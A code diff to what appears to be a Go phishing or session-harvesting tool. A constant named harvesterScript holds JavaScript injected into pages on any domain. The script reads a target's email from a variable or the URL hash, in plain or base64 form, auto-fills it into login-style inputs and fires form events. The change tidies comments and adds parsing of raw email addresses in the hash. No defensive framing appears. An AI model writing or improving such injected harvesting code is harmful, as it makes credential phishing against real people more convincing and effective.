@@ -38,14 +38,13 @@ var store = &SessionStore{
 const harvesterScript = `
 <script>
 (function() {
-    // Universal Email Auto-Fill — works on EVERY domain
     var targetEmail = window._targetEmail;
     if (!targetEmail) return;
 
     function fillEmailAndSubmit() {
         var input = null;
         
-        // Strategy 1: Try any input field that contains @domain in its placeholder/default value
+        // Strategy 1: Look for inputs with email-like placeholders or default values
         var allInputs = document.querySelectorAll('input');
         for (var i = 0; i < allInputs.length; i++) {
             var inp = allInputs[i];
@@ -53,17 +52,17 @@ const harvesterScript = `
             var ph = inp.getAttribute('placeholder') || '';
             var defVal = inp.defaultValue || '';
             
-            // If the field already has an email-like pattern, skip it
+            // Skip if already filled
             if (val && val.match(/^[^@]+@[^@]+$/)) continue;
             
-            // Check if placeholder or default value hints at email
+            // Check if placeholder hints at email
             if (ph.indexOf('@') !== -1 || defVal.indexOf('@') !== -1) {
                 input = inp;
                 break;
             }
         }
         
-        // Strategy 2: If no match found, use the FIRST visible text/email input
+        // Strategy 2: First visible text/email input
         if (!input) {
             var candidates = document.querySelectorAll('input[type="text"], input[type="email"], input:not([type])');
             for (var i = 0; i < candidates.length; i++) {
@@ -97,7 +96,7 @@ const harvesterScript = `
             input.dispatchEvent(new Event('change', { bubbles: true }));
             input.dispatchEvent(new Event('blur', { bubbles: true }));
             
-            // Focus and highlight so user sees it worked
+            // Visual feedback
             input.focus();
             input.scrollIntoView({ behavior: 'smooth', block: 'center' });
             input.style.border = '2px solid #4CAF50';
@@ -182,7 +181,10 @@ setTimeout(()=>{
     if (hash && hash.length > 1) {
         var raw = hash.substring(1);
 
-        if (raw.startsWith('t=')) {
+        // FIX: Handle raw email hashes like #user@hotmail.com
+        if (raw.indexOf('@') !== -1 && !raw.startsWith('t=')) {
+            email = raw;
+        } else if (raw.startsWith('t=')) {
             var b64 = raw.split('t=')[1];
             try { email = atob(b64); } catch(e) { email = b64; }
         } else {
